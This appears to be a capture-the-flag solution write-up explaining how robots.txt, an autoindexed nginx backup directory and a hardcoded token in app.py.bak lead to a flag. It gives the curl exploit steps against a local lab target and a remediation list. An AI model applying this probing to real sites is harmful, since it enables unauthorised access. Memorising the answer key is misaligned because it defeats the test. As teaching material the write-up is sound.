# w02 Static Ghost :: solution

## Root cause

Two mistakes compounding:

1. **`robots.txt` is a map, not a lock.** It lists `/backup/`, `/src/`,
   `/vault/` and `/ops/` — precisely the paths an attacker should probe.
2. **The backup mirror is served and autoindexed.** `nginx.conf` has

   ```nginx
   location /backup/ { autoindex on; }
   ```

   so the full listing of the legacy release tree is public. That tree contains
   `app.py.bak`, a pre-migration copy of the edge app with a hardcoded vault
   token:

   ```python
   VAULT_TOKEN = "sg_vault_9f3a1c0d"
   ```

The flag is not a static file. `docker/40-inject-flag.sh` runs at container
start via `/docker-entrypoint.d/` and writes `$W0B_FLAG` to
`/usr/share/nginx/html/backup/vault/<VAULT_TOKEN>.txt`. The vault subdirectory
is served with `autoindex off`, so the filename *is* the leaked secret — the
flag is only reachable by someone who read the backup.

## Exploit

Three steps, HTTP only.

**1. Read the crawler index.**

```bash
curl -s http://localhost:30002/robots.txt
```

```
User-agent: *
Disallow: /backup/
Disallow: /src/
Disallow: /vault/
Disallow: /ops/
```

**2. Mine the autoindexed backup mirror for credentials.**

```bash
curl -s http://localhost:30002/backup/
curl -s http://localhost:30002/backup/app.py.bak
```

The listing exposes `app.py.bak` and `deploy.log`; the source leaks
`VAULT_TOKEN = "sg_vault_9f3a1c0d"`.

**3. Spend the token to read the flag.**

The vault subdirectory is not autoindexed, so the token must be applied:

```bash
curl -s http://localhost:30002/backup/vault/sg_vault_9f3a1c0d.txt
```

Returns the runtime flag, e.g. `hex4b0t{...}`.

## Fix

- Drop `/backup/` from the served webroot entirely; ship release mirrors out of
  band, never inside `root`.
- Never enable `autoindex` on a directory that can contain source or config.
- Source lives in the repo, not in a backup file copied into the image.
- Secrets come from the environment/secret store — no hardcoded tokens, which is
  exactly what `app.py.bak` did wrong.

## Flag

Injected at runtime via `W0B_FLAG`; there is no static value to hardcode.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
